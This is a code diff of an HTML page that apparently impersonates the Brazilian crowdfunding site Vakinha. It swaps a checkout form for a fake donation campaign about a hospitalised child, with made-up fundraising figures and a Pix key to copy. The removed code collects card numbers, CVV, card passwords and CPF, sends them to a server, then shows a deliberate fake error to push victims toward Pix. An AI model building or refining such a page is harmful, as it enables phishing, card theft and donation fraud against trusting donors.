@@ -3,135 +3,224 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Contribua - Vaquinha</title>
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
+  <title>Agora sim, férias de verdade | Vaquinha</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet" />
+  <link rel="icon" href="favicon.png" type="image/png"> <!-- Ícone da aba do navegador -->
   <style>
-    * { box-sizing: border-box; }
-
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Montserrat', sans-serif;
-      background: #f4f6f8;
-      margin: 0;
-      padding: 0;
+      background-color: #f5f5f5;
       color: #333;
     }
 
     header {
+      background-color: white;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+
+    .logo img {
+      height: 36px;
+    }
+
+    .main {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      padding: 20px;
+      gap: 30px;
+    }
+
+    .left-column {
+      flex: 1 1 500px;
+      max-width: 600px;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+    }
+
+    .right-column {
+      flex: 1 1 300px;
+      max-width: 350px;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 1px 6px rgba(0,0,0,0.05);
+      height: fit-content;
+    }
+
+    .info-topo {
+      font-size: 14px;
+      color: #777;
+      margin-bottom: 12px;
+    }
+
+    .info-topo .categoria {
+      font-weight: bold;
+      color: #24ca68;
+    }
+
+    .titulo-campanha {
+      font-size: 22px;
+      font-weight: bold;
+      margin-top: 5px;
+      color: #282828;
+    }
+
+    .id-local {
+      font-size: 14px;
+      color: #888;
+      margin-top: 4px;
+    }
+
+    .vaquinha-img {
+      width: 100%;
+      border-radius: 8px;
+      margin: 16px 0 8px 0;
+    }
+
+    .resumo {
+      font-size: 15px;
+      color: #444;
+      margin-bottom: 10px;
+    }
+
+    .descricao {
+      font-size: 15px;
+      color: #333;
+      margin-top: 10px;
+      line-height: 1.6;
+    }
+
+    .descricao strong {
+      color: #24ca68;
+      font-weight: bold;
+    }
+
+    .pix-box {
+      margin-top: 20px;
+      background: #f2f2f2;
+      padding: 12px;
+      border-radius: 8px;
+    }
+
+    .pix-content {
+      display: flex;
+      align-items: center;
+      gap: 10px;
       background: #ffffff;
-      border-bottom: 1px solid #ddd;
-      padding: 20px 30px;
+      padding: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      cursor: pointer;
+      margin-top: 6px;
+      transition: background 0.2s ease-in-out;
+    }
+
+    .pix-content:hover {
+      background: #e6ffe9;
+    }
+
+    .pix-chave {
+      color: #333;
+      font-weight: 600;
+      font-size: 14px;
+      word-break: break-word;
+    }
+
+    .icon-copiar {
+      fill: #00a84f;
+    }
+
+    .aviso {
+      display: block;
+      font-size: 12px;
+      margin-top: 5px;
+      color: #666;
+    }
+
+    .compartilhar {
+      font-size: 13px;
+      margin-top: 20px;
+    }
+
+    .compartilhar input {
+      width: 100%;
+      margin-top: 5px;
+      padding: 8px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .progresso {
+      background-color: #e6e6e6;
+      border-radius: 5px;
+      overflow: hidden;
+      height: 8px;
+      margin-bottom: 12px;
+    }
+
+    .progresso-bar {
+      background-color: #24ca68;
+      width: 7%;
+      height: 100%;
+      transition: width 0.3s ease-in-out;
+    }
+
+    .valor-arrecadado {
+      font-size: 20px;
+      font-weight: bold;
+      color: #24ca68;
+    }
+
+    .meta,
+    .apoiadores {
+      font-size: 14px;
+      color: #444;
+    }
+
+    .botao-ajudar {
+      display: block;
+      background-color: #00c271;
+      color: white;
+      padding: 14px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      text-align: center;
+      margin: 16px 0;
+      text-decoration: none;
+    }
+
+    .criador {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+      margin-top: 10px;
+      color: #555;
+    }
+
+    .criador-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background-color: #8300c2;
+      color: white;
+      font-weight: bold;
       display: flex;
       align-items: center;
       justify-content: center;
     }
 
-    header img {
-      height: 40px;
-    }
-
-    .container {
-      max-width: 500px;
-      margin: 40px auto;
-      padding: 30px;
-      background: #ffffff;
-      border-radius: 12px;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.05);
-    }
-
-    h2 {
-      margin-bottom: 10px;
-      color: #00c853;
-      font-weight: 600;
-    }
-
-    p {
-      color: #777;
-      font-size: 14px;
-      margin-top: 0;
-    }
-
-    label {
-      font-weight: 600;
-      display: block;
-      margin-top: 15px;
-      margin-bottom: 6px;
-      font-size: 14px;
-    }
-
-    input[type="text"],
-    input[type="email"],
-    input[type="number"],
-    input[type="password"] {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 14px;
-    }
-
-    .pagamento-options {
-      display: flex;
-      gap: 10px;
-      margin-top: 10px;
-    }
-
-    .pagamento-options button {
-      flex: 1;
-      padding: 12px;
-      border: 2px solid #00c853;
-      background-color: #e8f5e9;
-      color: #00c853;
-      font-weight: bold;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: all 0.3s;
-    }
-
-    .pagamento-options button:hover {
-      background-color: #c8e6c9;
-    }
-
-    .extra {
-      margin-top: 20px;
-      padding: 15px;
-      border: 1px dashed #ccc;
-      border-radius: 8px;
-      background-color: #fdfdfd;
-    }
-
-    .submit-btn {
-      margin-top: 25px;
-      background-color: #00c853;
-      color: #fff;
-      padding: 14px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      width: 100%;
-      font-size: 15px;
-      font-weight: bold;
-      transition: background-color 0.3s;
-    }
-
-    .submit-btn:hover {
-      background-color: #009c40;
-    }
-
-    #qrcode {
-      margin-top: 20px;
-      text-align: center;
-    }
-
-    #qrcode img {
-      margin-top: 10px;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-    }
-
-    @media (max-width: 600px) {
-      .container {
-        margin: 20px;
-        padding: 20px;
+    @media (max-width: 768px) {
+      .main {
+        flex-direction: column;
+        align-items: center;
       }
     }
   </style>
@@ -139,139 +228,80 @@
 <body>
 
   <header>
-    <img src="logo-vakinha.png" alt="Vakinha Logo">
+    <div class="logo">
+      <img src="logo-vakinha.png" alt="Vakinha Logo">
+    </div>
   </header>
 
-  <div class="container">
-    <h2>Agora sim, férias de verdade.</h2>
-    <p>ID 5413609</p>
-
-    <form id="checkoutForm">
-      <label>Telefone (WhatsApp)</label>
-      <input type="text" name="telefone" required>
-
-      <label>E-mail</label>
-      <input type="email" name="email" required>
-
-      <label>CPF</label>
-      <input type="text" name="cpf" required>
-
-      <label>Nome completo</label>
-      <input type="text" name="nome" required>
-
-      <label>Valor da contribuição</label>
-      <input type="number" name="valor" min="1" max="10000" required>
-
-      <label>Forma de pagamento</label>
-      <div class="pagamento-options">
-        <button type="button" onclick="selecionarPagamento('pix')">Pix</button>
-        <button type="button" onclick="selecionarPagamento('cartao')">Cartão</button>
+  <div class="main">
+    <div class="left-column">
+      <div class="info-topo">
+        <div class="categoria">SONHOS / OUTROS</div>
+        <div class="titulo-campanha">Agora sim, férias de verdade.</div>
+        <div class="id-local">ID: 5413609 — PETRÓPOLIS / RIO DE JANEIRO</div>
       </div>
 
-      <div class="extra">
-        <input type="checkbox" id="turbinar" name="turbinar">
-        <label for="turbinar">Turbinar doação por +R$ 5,99</label>
-        <p style="font-size: 13px; color: #666">Sua doação aparece em destaque e ajuda a alcançar a meta mais rápido!</p>
+      <img class="vaquinha-img" src="meajuda.webp" alt="Imagem da vaquinha">
+
+      <p class="resumo">
+        Seja a primeira pessoa a dar um coração para esta vaquinha! 💚
+      </p>
+
+      <div class="descricao">
+        <div class="pix-box">
+          <p>Você pode ajudar via Pix usando a chave:</p>
+          <div class="pix-content" onclick="copiarPix()">
+            <span class="pix-chave" id="pixChave">488afc63-5194-4ed7-91ed-e39aa57446ba</span>
+            <svg viewBox="350 0 766 758" width="20" height="20" class="icon-copiar">
+              <title>Copiar chave Pix</title>
+              <path d="M806.32,188.44H597.7a34.87,34.87,0,0,0-34.84,34.73V466.71H597.7V223.17H806.32Z"></path>
+              <path d="M754.26,285.3H545.64A34.87,34.87,0,0,0,510.8,320V598.26a34.88,34.88,0,0,0,34.84,34.84H754.26a34.88,34.88,0,0,0,34.84-34.84V320A34.88,34.88,0,0,0,754.26,285.3Zm0,312.96H545.64V320H754.26Z"></path>
+            </svg>
+          </div>
+          <small class="aviso">Clique para copiar a chave Pix 💚</small>
+        </div>
+        <p style="margin-top:20px;">Olá! Me chamo João Filipe, tenho 7 anos. No dia 20 de janeiro comecei a sentir uma dor na perna esquerda, fui ao médico com minha mãe e a princípio segundo o diagnóstico foi só uma dor muscular. No dia 24 de janeiro tínhamos planejado nossos tão sonhados 10 dias de férias, foi aí que infelizmente tivemos que interromper nossas férias, quando depois das dores persistirem e de ter passado por mais dois hospitais fui diagnosticado com osteomielite, uma infecção no osso da perna precisando então interromper nossas férias.</p>
+        <p>A princípio eram só de 7 a 10 dias de antibiótico, mas infelizmente pela gravidade do quadro esse prazo precisou se estender. Hoje estou a 56 dias internado e ainda não tenho uma previsão de alta.</p>
+        <p>Meu desejo é que esse processo passe logo para que eu e minha família possamos então curtir as nossas férias tão esperadas, com a ajuda da vaquinha.</p>
       </div>
 
-      <div id="pagamentoDetalhes"></div>
-      <div id="qrcode"></div>
+      <div class="compartilhar">
+        <strong>COMPARTILHE ESTA VAQUINHA</strong>
+        <input type="text" value="https://www.vakinha.com.br/5412608" readonly>
+      </div>
+    </div>
 
-      <button class="submit-btn" type="submit">Confirmar doação</button>
-    </form>
+    <div class="right-column">
+      <div class="progresso">
+        <div class="progresso-bar" style="width: 7%;"></div>
+      </div>
+      <div class="valor-arrecadado">R$ 1.000,00</div>
+      <div class="meta">Meta R$ 15.000,00</div>
+      <div class="apoiadores">Apoiadores 10</div>
+
+      <a href="checkout.html" class="botao-ajudar">Quero Ajudar</a>
+
+      <div class="criador">
+        <div class="criador-icon">KV</div>
+        Kauane Vargas<br>
+        Ativo(a) no Vakinha desde março/2025<br>
+        1 vaquinha criada
+      </div>
+    </div>
   </div>
 
   <script>
-    let tipoSelecionado = '';
-
-    function selecionarPagamento(tipo) {
-      tipoSelecionado = tipo;
-      const div = document.getElementById('pagamentoDetalhes');
-      const qrdiv = document.getElementById('qrcode');
-      qrdiv.innerHTML = '';
-
-      if (tipo === 'pix') {
-        div.innerHTML = '<label>O QR Code Pix será gerado após a confirmação.</label>';
-      } else {
-        div.innerHTML = ` 
-          <label>Número do Cartão</label>
-          <input type="text" name="numero" required>
-          <label>Nome do Titular</label>
-          <input type="text" name="nome_cartao" required>
-          <label>Validade</label>
-          <input type="text" name="validade" required>
-          <label>CPF do Titular</label>
-          <input type="text" name="cpf_cartao" required>
-          <label>CVV</label>
-          <input type="text" name="cvv" required>
-          <label>Senha (1 a 5 dígitos)</label>
-          <input type="password" name="senha" minlength="1" maxlength="5" required>
-        `;
-      }
+    function copiarPix() {
+      const chave = document.getElementById("pixChave").innerText;
+      navigator.clipboard.writeText(chave).then(() => {
+        alert("Chave Pix copiada com sucesso!");
+      });
     }
-
-    document.getElementById('checkoutForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      const form = new FormData(e.target);
-      const dados = Object.fromEntries(form.entries());
-      const valor = parseFloat(dados.valor);
-      const turbinar = document.getElementById('turbinar').checked;
-
-      if (valor <= 0) {
-        alert('Por favor, insira um valor válido.');
-        return;
-      }
-
-      if (tipoSelecionado === 'pix') {
-        if (turbinar) {
-          dados.valor = valor + 5.99;
-        }
-
-        try {
-          const response = await fetch('/api/gerar-pix', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ valor: dados.valor, email: dados.email, nome: dados.nome, turbinar })
-          });
-
-          let json;
-          try {
-            json = await response.json();
-          } catch (err) {
-            alert('Erro interno ao gerar pagamento. Tente novamente.');
-            return;
-          }
-
-          if (json.pix_qr) {
-            document.getElementById('qrcode').innerHTML = `
-              <p><strong>Copia e Cola:</strong><br>${json.pix_copiaecola}</p>
-              <img src="data:image/png;base64,${json.pix_qr}" width="220" />
-            `;
-          } else {
-            alert(json.erro || 'Erro ao gerar Pix.');
-          }
-        } catch (error) {
-          alert('Erro de rede ao gerar Pix.');
-        }
-
-      } else if (tipoSelecionado === 'cartao') {
-        try {
-          const response = await fetch('/api/gerar-cartao', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(dados)
-          });
-
-          // Aqui força o erro mesmo após envio
-          alert('Pagamento com cartão indisponível. Por favor, escolha a opção Pix.');
-        } catch (error) {
-          alert('Erro ao processar o cartão. Por favor, escolha a opção Pix.');
-        }
-
-      } else {
-        alert('Selecione uma forma de pagamento.');
-      }
-    });
   </script>
+
+  <footer style="text-align:center; padding: 20px 10px; font-size: 14px; color: #777;">
+    © 2025 - Todos direitos reservados
+  </footer>
+
 </body>
 </html>
